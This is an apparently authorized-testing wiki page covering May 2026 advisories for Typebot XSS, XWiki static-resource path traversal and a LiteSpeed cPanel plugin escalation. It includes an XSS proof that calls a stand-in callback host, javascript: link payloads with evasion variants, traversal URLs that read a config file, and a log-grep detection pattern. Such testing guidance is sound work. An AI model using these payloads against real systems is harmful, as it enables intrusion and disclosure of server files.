# Typebot, XWiki, and LiteSpeed cPanel boundary batch (GHSA / KEV, 2026-05-26)

**Signal:** GitHub Security Advisories published three fresh app-boundary issues on **2026-05-26**, and CISA KEV added actively exploited `CVE-2026-48172` for the LiteSpeed cPanel plugin. The useful operator pattern is not the advisory list itself; it is the repeatable testing surface: rich-content renderers that cross origins, static-resource endpoints that normalize paths late, and hosting-control plugins that expose privileged toggles through user-facing control-panel actions.

## Items in scope

| Item | Primitive | Why it matters for authorized testing |
| --- | --- | --- |
| Typebot `GHSA-6m7c-xfhp-p9fh` / `CVE-2026-28445` | stored XSS through rating-block custom SVG rendered with `innerHTML` | imported templates and collaborator edits can execute in the builder preview origin, bypassing the intended `isUnsafe` worker sandbox |
| Typebot `GHSA-hqmv-v56g-4m47` / `CVE-2026-39964` | stored `javascript:` link execution in text/image bubble anchors | bot-authored rich text can become host-origin script when embedded and clicked by a visitor |
| XWiki `GHSA-xq3r-2qv5-vqqm` / `CVE-2026-23734` | path traversal in `ssx` / `jsx` resources parameter with a leading slash | static-resource helpers can disclose server-side config files such as `WEB-INF/xwiki.cfg` |
| LiteSpeed cPanel plugin `CVE-2026-48172` | unauthenticated privilege escalation related to Redis enable/disable handling | shared-hosting control-panel plugins can expose root-adjacent action gadgets from low-visibility endpoints |

## Operator value

This batch gives four durable checks to reuse during web and SaaS assessments:

1. **Builder-preview XSS is different from public-viewer XSS.** If a product deliberately allows JavaScript in published content, still test whether imported templates, previews, and admin builders run untrusted blocks on the privileged application origin.
2. **Sandbox flags are only as strong as coverage.** Typebot protected imported Script blocks with `isUnsafe`, but a rating icon SVG skipped that path and rendered through `innerHTML`.
3. **Rich-text URL fields need scheme validation at render time.** `target="_blank" rel="noopener"` does not neutralize `javascript:` URLs.
4. **Static asset endpoints often hide file-read bugs.** XWiki's `ssx` / `jsx` resource path shows why `resource=/../../...` deserves a place in path traversal probes, especially on Java app servers.
5. **Control-panel plugins deserve action-level fuzzing.** KEV's LiteSpeed cPanel entry points to `cpanel_jsonapi_func=redisAble`, a useful search string for endpoint discovery and exposure review in authorized hosting environments.

## Typebot validation workflow

Use a test workspace and a disposable bot. Do not target third-party builders or visitors without explicit scope.

### Builder-preview sandbox bypass

1. Create or import a bot with a rating input block.
2. Enable a custom icon.
3. Put a harmless proof payload in `customIcon.svg`, such as an image tag that requests a collaborator-controlled callback URL.
4. Preview the bot in the builder.
5. Capture whether the callback fires from the builder origin and whether it can read non-sensitive proof data such as `location.origin`.

A minimal proof shape:

```html
<img src=x onerror="fetch('https://callback.example/typebot-rating?o='+encodeURIComponent(location.origin))">
```

Do not collect real cookies or tokens. For a report, prove origin and execution context without exfiltrating secrets.

### `javascript:` rich-text link execution

1. Add a text bubble or image bubble link in a test bot.
2. Set the URL to a harmless `javascript:` proof such as `javascript:alert(document.domain)` or a callback that only includes the origin.
3. Publish or preview in the approved environment.
4. Click the link and document whether it executes in the viewer, embed host, or a contained iframe.

Check both:

- text bubble rich-text anchors;
- image bubble link wrappers.

## XWiki static-resource traversal workflow

Only test instances where file-read validation is allowed.

1. Fingerprint XWiki and the app server path style.
2. Probe `ssx` and `jsx` endpoints with a leading-slash traversal.
3. Prefer low-risk known files first; only request config files if scope permits.
4. Compare `minify=false` and default minified behavior.

Example low-noise probe shape:

```text
/bin/ssx/Main/WebHome?resource=/../../WEB-INF/xwiki.cfg&minify=false
/bin/jsx/Main/WebHome?resource=/../../WEB-INF/xwiki.cfg&minify=false
```

Useful evidence:

- status code and content type;
- a short non-secret marker proving file class;
- whether Tomcat or another servlet container changes behavior;
- exact XWiki version and servlet context path.

## LiteSpeed cPanel plugin triage

`CVE-2026-48172` is already in CISA KEV and described as exploited in the wild. For Skillz Wiki, the offensive value is target-shaping and authorized validation boundaries, not exploitation instructions.

During a sanctioned hosting-control assessment:

1. Enumerate cPanel / WHM hosts and installed LiteSpeed plugin versions.
2. Look for exposed cPanel JSON API surfaces and Redis enable/disable actions.
3. Search approved logs or captured traffic for the function marker:

```bash
grep -rE "cpanel_jsonapi_func=redisAble" /var/cpanel/logs /usr/local/cpanel/logs/ 2>/dev/null
```

4. If active validation is allowed, coordinate with the owner before touching Redis-related plugin actions; these are privileged hosting-control operations.

Report the plugin version, endpoint exposure path, role requirements, and whether the action is reachable without authentication, with a low-impact proof agreed in advance.

## Bypass and variant checks

- SVG fields rendered with `innerHTML`, `dangerouslySetInnerHTML`, or equivalent framework escape hatches.
- Imported template sanitizers that flag only obvious script blocks but ignore media/icon/label fields.
- Rich-text links with encoded or mixed-case schemes: `JaVaScRiPt:`, whitespace-prefixed schemes, HTML entities, and URL-normalization differences.
- Static resource endpoints that accept absolute-looking paths before joining to a base directory.
- Java servlet containers where `/../../WEB-INF/...` survives an early normalization step.
- Control-panel plugin functions reachable through older JSON API compatibility routes.

## Reporting heuristic

For XSS / builder-preview issues, include:

- whether the payload came from import, collaborator edit, public template, or bot owner content;
- the victim context: builder origin, viewer origin, embedded host origin, or iframe;
- why existing sandboxing did not apply;
- a non-secret proof of execution.

For traversal issues, include:

- endpoint, parameter, path normalization behavior, and container;
- a minimal file-read proof that avoids exposing secrets;
- fixed and affected version ranges.

For cPanel plugin issues, include:

- plugin version and installation path;
- exact role or authentication state required;
- request markers and log evidence;
- whether the proof altered Redis, user privileges, files, or service state.

## Sources

- [GitHub Advisory Database: Typebot rating-block custom icon XSS](https://github.com/advisories/GHSA-6m7c-xfhp-p9fh)
- [GitHub Advisory Database: Typebot `javascript:` URI XSS](https://github.com/advisories/GHSA-hqmv-v56g-4m47)
- [GitHub Advisory Database: XWiki static-resource traversal](https://github.com/advisories/GHSA-xq3r-2qv5-vqqm)
- [CISA KEV: CVE-2026-48172](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-48172)
- [LiteSpeed cPanel plugin security update](https://blog.litespeedtech.com/2026/05/21/security-update-for-litespeed-cpanel-plugin/)
